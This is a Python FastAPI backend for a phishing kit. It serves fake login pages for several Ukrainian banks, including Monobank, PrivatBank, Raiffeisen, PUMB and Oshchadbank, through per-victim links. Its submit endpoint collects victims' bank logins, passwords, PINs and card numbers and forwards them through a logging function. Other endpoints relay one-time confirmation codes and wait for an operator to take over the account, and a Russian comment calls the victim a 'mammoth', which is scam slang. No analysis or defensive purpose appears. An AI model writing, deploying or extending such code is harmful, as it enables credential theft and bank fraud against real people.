    from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Optional
from database.db import Database
from utils import send_log, send_confirm_code
from config import status_link, logger
from asyncio import sleep


db = Database()

class StepData(BaseModel):
    currentPath: str
    bank: str
    login: Optional[str] = None
    password: Optional[str] = None
    pin_code: Optional[str] = None
    card_number: Optional[str] = None


app = FastAPI()
templates = Jinja2Templates(directory="templatese")


app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/check")
async def check(endpoint: str):
    code = endpoint.split("/")[2]
    logger.debug(status_link)
    timeout = 120 # Ждем две минуты пока вбивер возьмет мамонта
    for i in range(timeout):
        if code in status_link:
            return {
                "status": "ready",
                "code": code
            }
        await sleep(1)

    return {
        "status": "not_ready",
        "code": code
    }

@app.post("/api/confirm")
async def confirm(request: Request):
    data = await request.json()
    endpoint = data['endpoint']
    code_confirm = data['code']
    await send_confirm_code(
        code=code_confirm,
        endpoint=endpoint
    )
@app.post("/api/submit")
async def submit(data: StepData):
    bank = data.bank or "Не нужно"
    login = data.login or "Не нужно"
    password = data.password or "Не нужно"
    pin_code = data.pin_code or "Не нужно"
    card_number = data.card_number or "Не нужно"
    endpoint = data.currentPath or "Не нужно"
    code = endpoint.split("/")[2]
    await send_log(
        bank=bank,
        login=login,
        password=password,
        pin_code=pin_code,
        card_number=card_number,
        code=code
    )

    
@app.get("/mono/{endpoint}", response_class=HTMLResponse)
async def mono(request: Request, endpoint: str):
    check = await db.get_endpoint(endpoint)
    if check is None:
        return
    return templates.TemplateResponse("mono/index.html", {"request": request})


@app.get("/raif/{endpoint}", response_class=HTMLResponse)
async def raif(request: Request, endpoint: str):
    check = await db.get_endpoint(endpoint)
    if check is None:
        return
    return templates.TemplateResponse("raif/index.html", {"request": request})


@app.get("/pumb/{endpoint}", response_class=HTMLResponse)
async def pumb(request: Request, endpoint: str):
    check = await db.get_endpoint(endpoint)
    if check is None:
        return
    return templates.TemplateResponse("pumb/index.html", {"request": request})


@app.get("/privat/{endpoint}", response_class=HTMLResponse)
async def privat(request: Request, endpoint: str):
    check = await db.get_endpoint(endpoint)
    if check is None:
        return
    return templates.TemplateResponse("privat/index.html", {"request": request})


@app.get("/oshad/{endpoint}", response_class=HTMLResponse)
async def oshad(request: Request, endpoint: str):
    check = await db.get_endpoint(endpoint)
    if check is None:
        return
    return templates.TemplateResponse("oshad/index.html", {"request": request})